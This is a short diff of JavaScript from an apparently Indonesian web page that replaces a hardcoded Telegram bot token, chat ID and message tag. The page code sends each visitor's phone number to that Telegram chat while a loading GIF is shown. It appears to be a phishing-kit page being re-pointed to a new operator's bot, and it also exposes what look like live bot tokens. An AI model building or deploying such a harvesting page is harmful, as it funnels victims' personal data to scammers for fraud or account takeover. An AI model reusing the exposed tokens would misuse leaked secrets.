@@ -173,8 +173,8 @@
     // Tampilkan GIF loading
     document.getElementById('loading').style.display = 'block';
 
-    const botToken = '7800475677:AAEAUKSxlQN4mJAWubIXNnoIKci6p--OM44'; // Ganti dengan token bot Telegram Anda
-    const chatId = '7565169793'; 
+    const botToken = '8003724594:AAEuBg5b2V9q3VERXCMsK2quh5yGkSPuz10'; // Ganti dengan token bot Telegram Anda
+    const chatId = '8006370725'; 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: {
@@ -182,7 +182,7 @@
         },
         body: JSON.stringify({
             chat_id: chatId,
-            text: `Nomor Telepon: ${phoneNumber}\nPesan: 🦅 Rajawali Abadi 🦅`
+            text: `Nomor Telepon: ${phoneNumber}\nPesan: 🦅 BERKAT YAKIN🦅`
         })
     })
     .then(response => response.json())
